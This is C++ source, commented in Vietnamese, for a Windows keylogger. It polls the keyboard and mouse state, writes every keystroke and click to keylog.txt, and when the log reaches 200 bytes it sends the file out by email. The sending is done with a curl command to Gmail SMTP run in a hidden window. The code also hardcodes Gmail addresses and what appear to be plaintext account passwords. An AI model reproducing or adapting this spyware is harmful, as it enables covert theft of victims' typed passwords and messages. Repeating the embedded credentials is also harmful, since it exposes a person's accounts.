#define _CRT_SECURE_NO_WARNINGS
#include<Windows.h>
#include<iostream>
#include<fstream>
#include<stdio.h>
#include<string>


#define UID "gmail full id :dinhtv1008@gmail.com"
#define PWD "gmail dinh1008a@"
//
#include<SmtpGuid.h>
#include<MailMsgProps.h>

using namespace std;
void sendEmail();

int main()
{
	char key;
	ofstream logfile;//tạo đối tượng thao tác với file để ghi
	ifstream infile;//để đọc ra

	logfile.open("keylog.txt", fstream::trunc);//xóa nội dung file
	logfile << "From:dinhtv1008@gmail.com\nTo:tvdinh1008@gmail.com\nSubject : KeyLogger!!\n";
	logfile.close();
	int length = 0;
	while (TRUE)
	{
		Sleep(100);
		for (key = 8; key <= 190; key++)
		{
			/*
				//Dùng hàm GetAsyncKeyState(<Key cần nhập>) có trong thư viện: #include <Windows.h>
				Get là hàm trả về giá trị hoặc trạng thái.
				Async là hàm bất đồng bộ nghĩa là thay vì nó lock lại (hàm scanf) đợi khi đọc một ký tự thì nó kiểm tra có ký tự nòa không và trả về luôn. (Bạn xem các tài liệu đồng bộ và bất đồng bộ).
				Key đối tương lấy thông tin là một nút ấn.
				State trạng thái của nút đó ấn hay không được ấn,
			*/
			if (GetAsyncKeyState(key) == -32767)
			{
				logfile.open("keylog.txt", fstream::app); //mở file cho việc ghi dữ liệu
				switch (key) //break là thoát ra khỏi switch case
				{
				case VK_SPACE:
					//cout << " ";//nếu là khoảng trắng
					logfile << " ";
					break;
				case VK_RETURN:
					//cout << "\n"; //ấn enter
					logfile << "\n[ENTER]";
					break;
				case VK_SHIFT:
					//cout << "\"SHIFT\"";// ấn shift
					logfile << "\n[SHIFT]";
					break;
				case VK_BACK:
					//cout << "\"BACK\"";
					logfile << "\n[BACK]";
					break;
				case VK_CAPITAL:
					//cout << "\"[CAPSLOCK]\"";
					logfile << "\n[CAPSLOCK]";
					break;
				case VK_RBUTTON:
					//cout << "\"Rclick\"";
					logfile << "\n[Rclick]";
					break;
				case VK_LBUTTON:
					//cout << "\"Lclick\"";
					logfile << "\n[Lclick]";
					break;
				case 188:
					logfile << ",";
					break;
				case 190:
					logfile << ".";
					break;
				default:
					logfile << key;
					break;
				}
				logfile.close();

				infile.open("keylog.txt", fstream::in);
				infile.seekg(0, ios_base::end);//tìm đến vị trí cuối file
				length = infile.tellg();//trả về vị trí của con trỏ file
				cout << "do dai xau: " << length << endl;
				infile.close();
				if (length >= 200)
				{
					//infile.seekg(0, ios_base::beg);//tìm đến vị trí bắt đầu file
					//buffer = (char*)calloc(1, length);
					//infile.read(buffer, length);	
					//gửi dữ liệu cho người khác
					sendEmail();
					//
					logfile.open("keylog.txt", fstream::trunc);//xóa nội dung file
					logfile<<"From:dinhtv1008@gmail.com\nTo:tvdinh1008@gmail.com\nSubject : KeyLogger!!\n";
					logfile.close();
				}
			}
		}
	}
	return 0;
}
void sendEmail()
{
	char* command = (char*)"curl smtp://smtp.gmail.com:587 -v --mail-from \"dinhtv1008@gmail.com\" --mail-rcpt \"tvdinh1008@gmail.com\" --ssl -u dinhtv1008@gmail.com:dinh1999a@ -T \"keylog.txt\" -k --anyauth";
	WinExec(command, SW_HIDE);
}